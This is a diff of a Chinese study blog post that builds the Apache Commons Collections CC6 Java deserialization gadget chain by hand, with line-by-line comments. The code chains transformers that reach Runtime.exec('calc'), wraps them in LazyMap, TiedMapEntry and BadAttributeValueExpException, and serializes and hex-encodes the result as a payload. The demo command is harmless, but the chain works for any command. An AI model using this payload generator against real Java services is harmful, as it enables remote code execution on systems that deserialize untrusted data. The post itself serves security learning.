@@ -5,7 +5,7 @@ description: 自己纯手搓CC6，附加超详细每行代码解释，感觉自�
 ---
 <!-- more -->
 ``` java
-// ----------------------------------------------------------------
+// ------------------------------------------------------------------------
 // import导入，以及具体干什么的  
   
 import org.apache.commons.collections.Transformer;  
@@ -53,10 +53,11 @@ import java.util.Map;
 public class cc6study {  
     public static void main(String[] args) throws Exception {  
   
-        // ======================================================  
+        
+// =================================================================  
         // 第二块：构造反射执行链（Transformer数组）  
   
-        //够着反射执行链（Transformer数组）  
+        //构成反射执行链（Transformer数组）  
         Transformer[] transformers = new Transformer[]{  
                 new ConstantTransformer(Runtime.class),  
                 //1. ConstantTransformer，无论传进来什么，固定返回Runtime.class  
@@ -87,7 +88,7 @@ public class cc6study {
         // 这一整条数组，交给 ChainedTransformer 串行跑。  
         // 输入 → ConstantTransformer → Invoker1 → Invoker2 → Invoker3 → 命令执行。  
   
-        //=================================================================  
+        //==================================================================  
         // 第三块 ：LzayMap+TideMapEntry跳板构造  
   
         Map innerMap = new HashMap();  
@@ -102,7 +103,12 @@ public class cc6study {
         TiedMapEntry entry = new TiedMapEntry(lazyMap,"testkey");  
         /*  
         TideMapEntry源码关键重写了toSting()：  
-         public String toString(){             return this.map.get(this.key).toString();         }         只要调用entry.toString()->自动执行lazyMap.get("testkey")->触发transform  
+         public String toString()
+         {
+                return this.map.get(this.key).toString();
+         }         
+         只要调用entry.toString()->自动执行lazyMap.get("testkey")
+         ->触发transform  
          这是二层跳板。  
         */  
         BadAttributeValueExpException bad = new BadAttributeValueExpException("aaa");  
@@ -115,19 +121,28 @@ public class cc6study {
         // valField.set(bad,entry):把bad.val从原来的字符串，替换成我们造好的TiedMapEntry对象！  
         // 即：现在 bad.val = TideMapEntry(lazyMap,"testkey")  
         /* BadAttributeValueExpExcrption.readObject()大致原生逻辑：  
-          peivate void readObject(ObjecrInputStream ois) throws IOException,          ClassNotFoundException {              ois.defaultReadObject();              val.toString(); ---------反序列化的时候，自动执行val.toString(),整体启动开关  
-          }         */  
-        // =======================================================    
+          peivate void readObject(ObjecrInputStream ois) throws IOException,          
+          ClassNotFoundException {              
+          ois.defaultReadObject();              
+          val.toString(); ----反序列化的时候，自动执行val.toString(),整体启动开关  
+          }         
+          */  
+        // ==============================================================    
         /*        整条链：  
-         ->ois.readObject()         ->BadAttributeValueExpException.readObject()         ->val.toString  这里的val被改成TideMapEntry  
-         ->TideMapEntry.toString()         ->lazyMap。get("testkey")  
+         ->ois.readObject()         
+         ->BadAttributeValueExpException.readObject()         
+         ->val.toString  这里的val被改成TideMapEntry  
+         ->TideMapEntry.toString()         
+         ->lazyMap。get("testkey")  
          ->LazyMap里面没有testkey，执行chainedTransformer(key)  
          ->链式Transformer依次执行：  
-         （"testkey" →【Constant】→ Runtime.class →【getMethod】→ getRuntime 方法  
+         （"testkey" →【Constant】→ Runtime.class →【getMethod】
+         → getRuntime 方法  
          →【invoke】→ Runtime 实例 →【exec】→ Runtime.exec("calc")）  
          ->返回进程  
         */  
-        //-----------------------------------------------------------               // 第五块:序列化，生成payload  
+        //------------------------------------------------------------------               
+        // 第五块:序列化，生成payload  
         ByteArrayOutputStream bos = new ByteArrayOutputStream();  
         // 前面有讲，把数据存在byte数组里面,这里就是bos，一个容器，里面封装了一个动态扩容的byte数组  
         // 值得注意的是bos只是容器，不能直接当字节数组读，所以有后面的byte[] payload = bos.toByteArray();  
@@ -147,7 +162,7 @@ public class cc6study {
         // StringBuilder可以不断往后追加内容，不会反复新建对象  
         for (byte b : payload) {  
             sd.append(String.format("%02x",b));  
-            // 02：不足两位的时候，前面补 0。比如字节 0x0a ->输出 0a，而不是 a            // Java 里byte 是有符号的负数，format 内部会自动处理，输出正确的两位hex。  
+            // 02：不足两位的时候，前面补 0。比如字节 0x0a ->输出 0a，而不是 a               // Java 里byte 是有符号的负数，format 内部会自动处理，输出正确的两位hex。 
             // sd.append(...),把转好的两位十六进制字符，追加到 sd 里面,  
             // 坏了连这个都不知道，暴露java低陋的水平功底了  
         }  
